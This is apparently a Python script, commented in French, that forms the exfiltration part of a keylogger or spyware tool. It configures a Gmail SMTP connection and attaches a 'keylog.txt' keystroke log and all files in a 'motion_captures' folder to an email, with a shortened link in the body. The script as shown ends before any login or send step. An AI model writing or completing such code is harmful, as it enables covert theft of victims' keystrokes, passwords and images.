import smtplib
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Paramètres de connexion Gmail
smtp_server = "smtp.gmail.com"
smtp_port = 587  # Port pour TLS
username = "xxxxxxx@gmail.com" 
password = "xxxxxxxxx"  # Mot de passe d'application

# Créer l'objet du message
msg = MIMEMultipart()
msg['From'] = username  # L'adresse email de l'expéditeur
msg['To'] = "xxxxxx@gmail.com"  # Adresse email du destinataire (corrigée)
msg['Subject'] = "Voici le fichier texte avec les entrées clavier "

# Ajouter le corps du message
body = "Bonjour,\n\nVoici le fichier texte que vous avez demandé le detail se trouve ici https://bit.ly/4gHmLDP ton retour est import.\n\nCordialement."
msg.attach(MIMEText(body, 'plain'))





# Ajouter une pièce jointe (fichier texte)
# Liste des fichiers et dossiers à envoyer
files_to_send = ["keylog.txt"]
folders_to_send = ["motion_captures"]

# Attacher les fichiers individuels
for filename in files_to_send:
    try:
        with open(filename, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header(
                'Content-Disposition',
                f'attachment; filename={filename}',
            )
            msg.attach(part)
        print(f"Fichier {filename} attaché avec succès.")
    except FileNotFoundError:
        print(f"Erreur : Le fichier {filename} est introuvable.")
    except Exception as e:
        print(f"Une erreur s'est produite lors de l'attachement de {filename}: {e}")

# Attacher les fichiers des dossiers
for folder in folders_to_send:
    if os.path.exists(folder) and os.path.isdir(folder):
        for filename in os.listdir(folder):
            file_path = os.path.join(folder, filename)
            try:
                with open(file_path, "rb") as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header(
                        'Content-Disposition',
                        f'attachment; filename={filename}',
                    )
                    msg.attach(part)
                print(f"Fichier {filename} du dossier {folder} attaché avec succès.")
            except Exception as e:
                print(f"Une erreur s'est produite lors de l'attachement de {filename} du dossier {folder}: {e}")
    else:
        print(f"Erreur : Le dossier {folder} est introuvable ou n'est pas un dossier.")
